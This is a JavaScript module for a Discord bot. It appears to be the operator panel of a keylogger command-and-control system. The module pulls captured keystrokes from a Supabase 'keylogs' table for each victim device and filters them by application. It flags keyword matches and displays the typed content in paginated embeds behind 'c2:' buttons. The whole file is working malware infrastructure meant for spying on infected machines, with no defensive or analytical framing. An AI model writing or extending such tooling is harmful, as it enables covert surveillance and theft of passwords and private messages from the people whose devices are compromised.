import { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } from 'discord.js'
import { paginationButtons } from './_utils.js'

export const name = 'keylogs'

const PAGE_SIZE = 5

export async function execute(message, args, { supabase, getTarget }) {
  const deviceId = getTarget(message.guild.id, message.author.id)
  const appFilter = args[0] || null
  const limit = parseInt(args[1], 10) || PAGE_SIZE

  let query = supabase
    .from('keylogs')
    .select('*', { count: 'exact' })
    .order('logged_at', { ascending: false })
    .limit(limit)

  if (deviceId) query = query.eq('device_id', deviceId)
  if (appFilter) query = query.ilike('app_name', `%${appFilter}%`)

  const { data: keylogs, count } = await query

  if (!keylogs || keylogs.length === 0) {
    return message.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0x2a2a7a)
          .setTitle('⌨ Keylogs')
          .setDescription(deviceId ? `No keylogs for \`${(deviceId || '').slice(0, 16)}…\`` : 'No keylogs found.')
          .setTimestamp(),
      ],
    })
  }

  const totalPages = Math.ceil(count / PAGE_SIZE) || 1
  const currentPage = 1

  const embeds = buildKeylogEmbeds(keylogs, count, currentPage, totalPages, deviceId, appFilter)

  const components = [paginationButtons('keylogs', currentPage, totalPages)]

  if (appFilter) {
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder().setCustomId('c2:keylogs:clear_filter').setLabel('❌ Clear Filter').setStyle(ButtonStyle.Danger),
      )
    components.push(row)
  }

  await message.reply({ embeds, components })
}

function buildKeylogEmbeds(keylogs, total, page, totalPages, deviceId, appFilter) {
  const embeds = []
  const chunkSize = 5

  for (let i = 0; i < keylogs.length; i += chunkSize) {
    const chunk = keylogs.slice(i, i + chunkSize)
    const title = i === 0
      ? `⌨ Keylogs (${total} entries)${appFilter ? ` · filter: ${appFilter}` : ''}`
      : '⌨ continued'

    const embed = new EmbedBuilder()
      .setColor(0xf39c12)
      .setTitle(title)
      .setFooter({ text: `Page ${page}/${totalPages}` })
      .setDescription(
        chunk.map(k => {
          const kw = k.keywords?.length ? ` ⚠️ **${k.keywords.join(', ')}**` : ''
          const content = (k.content || '').length > 300 ? k.content.slice(0, 300) + '…' : k.content || '*empty*'
          const time = k.logged_at ? new Date(k.logged_at).toLocaleString('en-GB', { hour12: false }) : '?'
          return [
            `**${k.app_name || 'Unknown App'}**${kw}`,
            `\`${(k.device_id || '').slice(0, 12)}…\` · ${time}`,
            '```',
            content,
            '```',
          ].join('\n')
        }).join('\n')
      )
      .setTimestamp()

    embeds.push(embed)
  }

  return embeds
}

export async function handleButton(interaction, args, { supabase, getTarget }) {
  const action = args[0]

  if (action === 'refresh' || action === 'list') {
    const deviceId = getTarget(interaction.guildId, interaction.user.id)
    let query = supabase
      .from('keylogs')
      .select('*', { count: 'exact' })
      .order('logged_at', { ascending: false })
      .limit(PAGE_SIZE)

    if (deviceId) query = query.eq('device_id', deviceId)
    const { data: keylogs, count } = await query

    if (!keylogs || keylogs.length === 0) {
      return interaction.update({
        embeds: [new EmbedBuilder().setColor(0x2a2a7a).setTitle('⌨ Keylogs').setDescription('No keylogs found.').setTimestamp()],
        components: [],
      })
    }

    const totalPages = Math.ceil(count / PAGE_SIZE) || 1
    const embeds = buildKeylogEmbeds(keylogs, count, 1, totalPages, deviceId, null)
    await interaction.update({ embeds, components: [paginationButtons('keylogs', 1, totalPages)] })
    return
  }

  if (action === 'page') {
    const page = parseInt(args[1], 10) || 1
    const deviceId = getTarget(interaction.guildId, interaction.user.id)

    let countQuery = supabase
      .from('keylogs')
      .select('id', { count: 'exact', head: true })
    if (deviceId) countQuery = countQuery.eq('device_id', deviceId)
    const { count } = await countQuery

    const totalPages = Math.ceil(count / PAGE_SIZE) || 1

    let query = supabase
      .from('keylogs')
      .select('*')
      .order('logged_at', { ascending: false })
      .range((page - 1) * PAGE_SIZE, page * PAGE_SIZE - 1)

    if (deviceId) query = query.eq('device_id', deviceId)
    const { data: keylogs } = await query

    const embeds = buildKeylogEmbeds(keylogs || [], count, page, totalPages, deviceId, null)
    await interaction.update({ embeds, components: [paginationButtons('keylogs', page, totalPages)] })
    return
  }
}
